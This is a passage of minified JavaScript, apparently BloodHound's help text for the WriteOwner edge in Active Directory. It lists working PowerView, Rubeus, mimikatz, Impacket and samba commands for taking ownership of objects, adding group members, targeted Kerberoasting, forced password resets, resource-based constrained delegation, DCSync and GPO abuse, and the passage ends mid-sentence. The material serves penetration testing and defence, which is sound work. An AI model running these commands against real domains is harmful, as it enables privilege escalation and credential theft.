wiki."})]}),references:()=>p(v,{sx:{overflowX:"auto"},children:[h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.youtube.com/watch?v=z8thoG7gPd0",children:"https://www.youtube.com/watch?v=z8thoG7gPd0"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/n00py/DCSync",children:"https://github.com/n00py/DCSync"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectorysecurityinheritance?view=netframework-4.8",children:"https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectorysecurityinheritance?view=netframework-4.8"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/addmember",children:"https://www.thehacker.recipes/ad/movement/dacl/addmember"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting",children:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/group-policies",children:"https://www.thehacker.recipes/ad/movement/group-policies"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword",children:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials",children:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"}),h("br",{}),h(S,{target:"_blank",rel:"noopener",href:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights",children:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights"})]})},WriteOwner:{general:({sourceName:e,sourceType:t,targetName:r,targetType:n})=>p(u,{children:[p(A,{variant:"body2",children:[kr(t,e)," the ability to modify the owner of the"," ",Cr(n)," ",r,"."]}),h(A,{variant:"body2",children:"Object owners retain the ability to modify object security descriptors, regardless of permissions on the object's DACL."})]}),windowsAbuse:({sourceName:e,sourceType:t,targetName:r,targetType:n,targetId:o})=>{switch(n){case"Group":return p(u,{children:[h(A,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:'Set-DomainObjectOwner -Credential $Cred -TargetIdentity "Domain Admins" -OwnerIdentity harmj0y'}),h(A,{variant:"body2",children:"To abuse ownership of a user object, you may grant yourself the AddMember privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:'Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers'}),h(A,{variant:"body2",children:"You can now add members to the group using the net binary or PowerView's Add-DomainGroupMember."}),h(A,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),p(A,{variant:"body2",children:["To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),h(A,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),h(A,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"}),h(A,{variant:"body2",children:"Cleanup for this can be done using Remove-DomainObjectAcl"}),h(A,{component:"pre",children:'Remove-DomainObjectAcl - Credential $cred -TargetIdentity "Domain Admins" -Rights WriteMembers'}),h(A,{variant:"body2",children:"Cleanup for the owner can be done by using Set-DomainObjectOwner once again"})]});case"User":return p(u,{children:[h(A,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Set-DomainObjectOwner -Credential $Cred -TargetIdentity dfm -OwnerIdentity harmj0y"}),h(A,{variant:"body2",children:"To abuse ownership of a user object, you may grant yourself the GenericAll privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All"}),h(A,{variant:"body1",children:" Targeted Kerberoast "}),h(A,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),h(A,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),h(A,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),h(A,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),h(A,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"}),h(A,{variant:"body1",children:"Force Change Password "}),h(A,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),p(A,{variant:"body2",children:["To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),h(A,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),h(A,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),p(A,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),h(A,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed with Remove-DomainObjectAcl:"}),h(A,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All"}),h(A,{variant:"body2",children:"Cleanup for the owner can be done by using Set-DomainObjectOwner once again"})]});case"Computer":return p(u,{children:[h(A,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Set-DomainObjectOwner -Credential $Cred -TargetIdentity windows1 -OwnerIdentity harmj0y"}),h(A,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll privilege."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),h(A,{variant:"body2",children:"Once you have granted yourself this privilege, you may read the ms-Ads-AdmPwd attribute on the computer object in LDAP which contains the local administrator password."}),h(A,{variant:"body2",children:"Alternatively, you can perform a resource based constrained delegation attack."}),h(A,{variant:"body2",children:"Generic write to a computer object can be used to perform a resource based constrained delegation attack."}),h(A,{variant:"body2",children:"Abusing this primitive is currently only possible through the Rubeus project."}),h(A,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),h(A,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),h(A,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),h(A,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),h(A,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),h(A,{component:"pre",children:'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)'}),h(A,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:"}),h(A,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),h(A,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),h(A,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),h(A,{variant:"body2",children:'And finally we can use Rubeus\' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:'}),h(A,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"}),h(A,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),h(A,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),h(A,{variant:"body2",children:"Cleanup for the owner can be done by using Set-DomainObjectOwner once again"})]});case"Domain":return p(u,{children:[h(A,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Set-DomainObjectOwner -Credential $Cred -TargetIdentity testlab.local -OwnerIdentity harmj0y"}),h(A,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync privileges."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"}),h(A,{variant:"body2",children:"Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain"}),h(A,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),h(A,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),h(A,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"}),h(A,{variant:"body2",children:"Cleanup for the owner can be done by using Set-DomainObjectOwner once again"})]});case"GPO":return p(u,{children:[h(A,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Set-DomainObjectOwner -Credential $Cred -TargetIdentity TestGPO -OwnerIdentity harmj0y"}),h(A,{variant:"body2",children:"To abuse ownership of a domain object, you may grant yourself the DcSync privileges."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),p(A,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",e,":"]}),h(A,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"}),h(A,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse"}),h(A,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),h(A,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"}),h(A,{variant:"body2",children:"Cleanup for the owner can be done by using Set-DomainObjectOwner once again"})]});case"OU":return p(u,{children:[h(A,{variant:"body1",children:"Control of the Organizational Unit"}),h(A,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),p(A,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ","User"===t?`${e} if you are not running a process as that user`:`a member of ${e} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),h(A,{component:"pre",children:"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}),h(A,{variant:"body2",children:"Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as a member of (the group that holds this ACE):"}),h(A,{component:"pre",children:"Set-DomainObjectOwner -Credential $Cred -TargetIdentity dfm -OwnerIdentity harmj0y"}),h(A,{variant:"body2",children:"Now with ownership of the OU object, you may grant yourself the GenericAll privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),h(A,{component:"pre",children:`Add-DomainObjectAcl -TargetIdentity ${o} -Rights All`}),h(A,{variant:"body2",children:"With full control of the OU, you may now add a new ACE on the OU that will inherit down to the objects under that OU. Below are two options depending on how targeted you choose to be in this step:"}),h(A,{variant:"body1",children:"Generic Descendent Object Takeover"}),h(A,{variant:"body2",children:"The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. Again, this can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the OU."}),p(A,{variant:"body2",children:["First, we need to reference the OU by its ObjectGUID, not its name. The ObjectGUID for the OU"," ",r," is: ",o,"."]}),p(A,{variant:"body2",children:["Next, we will fetch the GUID for all objects. This should be",h(A,{component:"pre",children:"'00000000-0000-0000-0000-000000000000':"})]}),h(A,{component:"pre",children:"$Guids = Get-DomainGUIDMap\n$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name"}),h(A,{variant:"body2",children:'Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:'}),h(A,{component:"pre",children:"$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"}),h(A,{variant:"body2",children:"Finally, we will apply this ACE to our target OU:"}),h(A,{component:"pre",children:"$OU = Get-DomainOU -Raw (OU GUID)\n$DsEntry = $OU.GetDirectoryEntry()\n$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n$dsEntry.PsBase.CommitChanges()"}),h(A,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),h(A,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),h(A,{variant:"body2",children:'If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" privilege against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView\'s help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:'}),h(A,{component:"pre",children:"$Guids = Get-DomainGUIDMap\n$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name\n$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name\n$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid\n$OU = Get-DomainOU -Raw Workstations\n$DsEntry = $OU.GetDirectoryEntry()\n$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'\n$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)\n$dsEntry.PsBase.CommitChanges()"})]});default:return null}},linuxAbuse:({sourceName:e,sourceType:t,targetName:r,targetType:n,haslaps:o})=>{switch(n){case"Group":return p(u,{children:[h(A,{variant:"body2",children:'To change the ownership of the object, you may use Impacket\'s owneredit example script (cf. "grant ownership" reference for the exact link).'}),h(A,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),h(A,{variant:"body1",children:" Modifying the rights "}),h(A,{variant:"body2",children:"To abuse ownership of a group object, you may grant yourself the AddMember privilege."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body1",children:" Adding to the group "}),h(A,{variant:"body2",children:"You can now add members to the group."}),h(A,{variant:"body2",children:"Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line:"}),h(A,{component:"pre",children:'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),p(A,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",h(A,{component:"pre",children:"ffffffffffffffffffffffffffffffff"}),"."]}),h(A,{component:"pre",children:'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),h(A,{variant:"body2",children:"Finally, verify that the user was successfully added to the group:"}),h(A,{component:"pre",children:'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),h(A,{variant:"body1",children:" Cleanup "}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'remove' -rights 'WriteMembers' -principal 'controlledUser' -target-dn 'groupDistinguidedName' 'domain'/'controlledUser':'password'"})]});case"User":return p(u,{children:[h(A,{variant:"body2",children:'To change the ownership of the object, you may use Impacket\'s owneredit example script (cf. "grant ownership" reference for the exact link).'}),h(A,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),h(A,{variant:"body2",children:"To abuse ownership of a user object, you may grant yourself the GenericAll privilege."}),h(A,{variant:"body2",children:'Impacket\'s dacledit can be used for that purpose (cf. "grant rights" reference for the link).'}),h(A,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),h(A,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),h(A,{variant:"body1",children:" Targeted Kerberoast "}),p(A,{variant:"body2",children:["A targeted kerberoast attack can be performed using"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/ShutdownRepo/targetedKerberoast",children:"targetedKerberoast.py"}),"."]}),h(A,{component:"pre",children:"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}),h(A,{variant:"body2",children:"The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well."}),h(A,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice."}),h(A,{variant:"body1",children:" Force Change Password "}),h(A,{variant:"body2",children:"Use samba's net tool to change the user's password. The credentials can be supplied in cleartext or prompted interactively if omitted from the command line. The new password will be prompted if omitted from the command line."}),h(A,{component:"pre",children:'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'}),p(A,{variant:"body2",children:["Pass-the-hash can also be done here with"," ",h(S,{target:"_blank",rel:"noopener",href:"https://github.com/byt3bl33d3r/pth-toolkit",children:"pth-toolkit's net tool"}),". If the LM hash is not known it must be replace with"," ",h(A,{component:"pre",children:" ffffffffffffffffffffffffffffffff"}),"."]}),h(A,{component:"pre",children:'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'}),h(A,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),h(A,{variant:"body1",children:" Shadow Credentials attack "}),p(A,{variant:"body2",children:["To abuse this privilege, use"," 